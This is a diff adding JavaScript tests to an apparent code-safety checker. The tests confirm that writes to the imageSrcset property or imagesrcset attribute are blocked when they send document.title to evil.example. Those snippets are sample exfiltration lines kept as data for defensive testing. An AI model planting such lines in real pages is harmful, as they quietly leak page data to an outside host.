@@ -1298,3 +1298,24 @@ describe('second audit (#48): a style element that can still be reached', () => 
     }
   })
 })
+
+describe('second audit (#48): imageSrcset', () => {
+  const SNIPPETS = [
+    `const link = document.createElement('div'); link.imageSrcset = 'https://evil.example/?' + document.title + ' 1x'`,
+    `const link = document.createElement('div'); link.setAttribute('imagesrcset', 'https://evil.example/?' + document.title + ' 1x')`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks the existing-element and object forms, and passes them with network declared', () => {
+    expect(blocks(`document.querySelector('link').imageSrcset = 'https://evil.example/?' + document.title + ' 1x'`)).toBe(true)
+    expect(blocks(`Object.assign(document.createElement('div'), { imageSrcset: 'https://evil.example/x 1x' })`)).toBe(true)
+    // An address is network use, so declaring the capability allows a written-out address.
+    expect(blocks(`const l = document.createElement('div'); l.imageSrcset = 'https://example.com/a.png 1x'`, ['network'])).toBe(false)
+    // The check is on the name, so a name that only looks similar is unaffected.
+    expect(blocks(`const l = document.createElement('div'); l.imageSizes = '100vw'`)).toBe(false)
+  })
+})
